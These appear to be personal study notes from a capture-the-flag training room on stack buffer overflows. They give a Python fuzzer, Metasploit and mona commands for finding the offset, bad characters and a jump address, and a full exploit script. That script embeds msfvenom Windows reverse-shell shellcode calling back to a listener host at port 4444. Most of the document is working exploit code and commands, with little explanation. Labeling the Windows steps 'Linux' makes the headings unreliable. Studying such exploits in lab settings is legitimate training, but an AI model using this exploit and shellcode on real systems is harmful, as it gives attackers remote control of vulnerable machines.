# Buffer Overflow

# Linux

***************************************************Note: notes are taken from buffer overflow prep room on THM***************************************************

## Finding the offset

Create [fuzzer.py](http://fuzzer.py) to figure out the offset

```bash
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.178.35"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

However many bytes the application crashed at, create a pattern 400 bytes longer

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2000
```

Put the generated string into the `string` variable.

![Untitled](Buffer%20Overflow%20cbd4b5d368af4ff59e2732849f9435b2/Untitled.png)

### Mona

```bash
!mona config -set workingfolder c:\mona\%p
!mona findmsp -distance 2000 #adjust distance to be the same length you did for msf_pattern_create
```

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset XXXX)`

![Untitled](Buffer%20Overflow%20cbd4b5d368af4ff59e2732849f9435b2/Untitled%201.png)

### Test offset

set the variables in the [fuzzer.py](http://fuzzer.py) script to be this and check that the EIP is 42424242

```bash
offset = 1306
string = prefix + "A" * offset + "BBBB"
```

![Untitled](Buffer%20Overflow%20cbd4b5d368af4ff59e2732849f9435b2/Untitled%202.png)

## Finding Bad Chars

look at generate_bad_chars.py

```bash
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

![Untitled](Buffer%20Overflow%20cbd4b5d368af4ff59e2732849f9435b2/Untitled%203.png)

Set the payload of [fuzzer.py](http://fuzzer.py) to be the bad chars

```bash
string = prefix + '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
```

run the script

### Mona

```bash
!mona bytearray -b "\x00"
!mona compare -f C:\mona\oscp\bytearray.bin -a <address> # address that ESP points to 
```

## Jump address

```bash
!mona jmp -r esp -cpb "\x00" #add the other bad characters you found
```

Youâ€™ll see the jump addresses in the mona output.

[Exploit.py](http://Exploit.py) should look like this rn

```bash
import socket

ip = "10.10.178.35"
port = 1337

prefix = "OVERFLOW7 "
offset = 1306
overflow = "A" * offset
retn = '\xaf\x11\x50\x62' #0x625011af
padding = "\x90" * 16
# msfvenom -p windows/shell_reverse_tcp LHOST=10.2.20.239 LPORT=4444 EXITFUNC=thread -b "\x00" -f c
payload = ("\xba\xa1\x99\x98\x7f\xdb\xc7\xd9\x74\x24\xf4\x58\x31\xc9"
"\xb1\x52\x31\x50\x12\x03\x50\x12\x83\x49\x65\x7a\x8a\x75"
"\x7e\xf9\x75\x85\x7f\x9e\xfc\x60\x4e\x9e\x9b\xe1\xe1\x2e"
"\xef\xa7\x0d\xc4\xbd\x53\x85\xa8\x69\x54\x2e\x06\x4c\x5b"
"\xaf\x3b\xac\xfa\x33\x46\xe1\xdc\x0a\x89\xf4\x1d\x4a\xf4"
"\xf5\x4f\x03\x72\xab\x7f\x20\xce\x70\xf4\x7a\xde\xf0\xe9"
"\xcb\xe1\xd1\xbc\x40\xb8\xf1\x3f\x84\xb0\xbb\x27\xc9\xfd"
"\x72\xdc\x39\x89\x84\x34\x70\x72\x2a\x79\xbc\x81\x32\xbe"
"\x7b\x7a\x41\xb6\x7f\x07\x52\x0d\xfd\xd3\xd7\x95\xa5\x90"
"\x40\x71\x57\x74\x16\xf2\x5b\x31\x5c\x5c\x78\xc4\xb1\xd7"
"\x84\x4d\x34\x37\x0d\x15\x13\x93\x55\xcd\x3a\x82\x33\xa0"
"\x43\xd4\x9b\x1d\xe6\x9f\x36\x49\x9b\xc2\x5e\xbe\x96\xfc"
"\x9e\xa8\xa1\x8f\xac\x77\x1a\x07\x9d\xf0\x84\xd0\xe2\x2a"
"\x70\x4e\x1d\xd5\x81\x47\xda\x81\xd1\xff\xcb\xa9\xb9\xff"
"\xf4\x7f\x6d\xaf\x5a\xd0\xce\x1f\x1b\x80\xa6\x75\x94\xff"
"\xd7\x76\x7e\x68\x7d\x8d\xe9\x9d\x80\x99\x06\xc9\x86\xa1"
"\xc9\x56\x0e\x47\x83\x76\x46\xd0\x3c\xee\xc3\xaa\xdd\xef"
"\xd9\xd7\xde\x64\xee\x28\x90\x8c\x9b\x3a\x45\x7d\xd6\x60"
"\xc0\x82\xcc\x0c\x8e\x11\x8b\xcc\xd9\x09\x04\x9b\x8e\xfc"
"\x5d\x49\x23\xa6\xf7\x6f\xbe\x3e\x3f\x2b\x65\x83\xbe\xb2"
"\xe8\xbf\xe4\xa4\x34\x3f\xa1\x90\xe8\x16\x7f\x4e\x4f\xc1"
"\x31\x38\x19\xbe\x9b\xac\xdc\x8c\x1b\xaa\xe0\xd8\xed\x52"
"\x50\xb5\xab\x6d\x5d\x51\x3c\x16\x83\xc1\xc3\xcd\x07\xe1"
"\x21\xc7\x7d\x8a\xff\x82\x3f\xd7\xff\x79\x03\xee\x83\x8b"
"\xfc\x15\x9b\xfe\xf9\x52\x1b\x13\x70\xca\xce\x13\x27\xeb"
"\xda")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

WE GOT A SHELL (upper panel of terminal)

![Untitled](Buffer%20Overflow%20cbd4b5d368af4ff59e2732849f9435b2/Untitled%204.png)

# Linux Buffer Overflows

## Tools

- PWK talks about edb
- Can also use gdb, ollydbg